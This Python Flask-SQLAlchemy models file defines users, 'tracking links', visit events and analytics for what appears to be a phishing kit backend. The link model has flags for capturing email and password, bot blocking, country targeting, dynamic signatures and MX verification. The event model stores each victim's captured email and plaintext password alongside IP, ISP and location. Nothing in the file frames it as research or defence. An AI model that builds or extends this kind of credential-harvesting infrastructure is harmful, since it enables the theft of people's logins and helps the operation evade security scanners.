from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime

db = SQLAlchemy()

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password_hash = db.Column(db.String(255), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    def __repr__(self):
        return f'<User {self.username}>'

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)

    def check_password(self, password):
        return check_password_hash(self.password_hash, password)

    def to_dict(self):
        return {
            'id': self.id,
            'username': self.username,
            'email': self.email,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'updated_at': self.updated_at.isoformat() if self.updated_at else None
        }

class TrackingLink(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    short_code = db.Column(db.String(20), unique=True, nullable=False)
    target_url = db.Column(db.Text, nullable=False)
    capture_email = db.Column(db.Boolean, default=False)
    capture_password = db.Column(db.Boolean, default=False)
    bot_blocking_enabled = db.Column(db.Boolean, default=True)
    geo_targeting_enabled = db.Column(db.Boolean, default=False)
    allowed_countries = db.Column(db.Text)  # JSON string
    rate_limiting_enabled = db.Column(db.Boolean, default=False)
    dynamic_signature_enabled = db.Column(db.Boolean, default=False)
    mx_verification_enabled = db.Column(db.Boolean, default=False)
    preview_template_url = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    user = db.relationship('User', backref=db.backref('tracking_links', lazy=True))

    def to_dict(self):
        return {
            'id': self.id,
            'user_id': self.user_id,
            'short_code': self.short_code,
            'target_url': self.target_url,
            'capture_email': self.capture_email,
            'capture_password': self.capture_password,
            'bot_blocking_enabled': self.bot_blocking_enabled,
            'geo_targeting_enabled': self.geo_targeting_enabled,
            'allowed_countries': self.allowed_countries,
            'rate_limiting_enabled': self.rate_limiting_enabled,
            'dynamic_signature_enabled': self.dynamic_signature_enabled,
            'mx_verification_enabled': self.mx_verification_enabled,
            'preview_template_url': self.preview_template_url,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'updated_at': self.updated_at.isoformat() if self.updated_at else None
        }

class TrackingEvent(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    link_id = db.Column(db.Integer, db.ForeignKey('tracking_link.id'), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    ip_address = db.Column(db.String(45))
    user_agent = db.Column(db.Text)
    country = db.Column(db.String(100))
    city = db.Column(db.String(100))
    isp = db.Column(db.String(255))
    captured_email = db.Column(db.String(255))
    captured_password = db.Column(db.String(255))
    redirect_status = db.Column(db.String(50))
    is_bot = db.Column(db.Boolean, default=False)
    block_reason = db.Column(db.String(255))

    tracking_link = db.relationship('TrackingLink', backref=db.backref('events', lazy=True))

    def to_dict(self):
        return {
            'id': self.id,
            'link_id': self.link_id,
            'timestamp': self.timestamp.isoformat() if self.timestamp else None,
            'ip_address': self.ip_address,
            'user_agent': self.user_agent,
            'country': self.country,
            'city': self.city,
            'isp': self.isp,
            'captured_email': self.captured_email,
            'captured_password': self.captured_password,
            'redirect_status': self.redirect_status,
            'is_bot': self.is_bot,
            'block_reason': self.block_reason
        }

class AnalyticsSummary(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    link_id = db.Column(db.Integer, db.ForeignKey('tracking_link.id'), nullable=False)
    total_clicks = db.Column(db.Integer, default=0)
    real_visitors = db.Column(db.Integer, default=0)
    blocked_attempts = db.Column(db.Integer, default=0)
    last_updated = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)

    tracking_link = db.relationship('TrackingLink', backref=db.backref('analytics', uselist=False))

    def to_dict(self):
        return {
            'id': self.id,
            'link_id': self.link_id,
            'total_clicks': self.total_clicks,
            'real_visitors': self.real_visitors,
            'blocked_attempts': self.blocked_attempts,
            'last_updated': self.last_updated.isoformat() if self.last_updated else None
        }

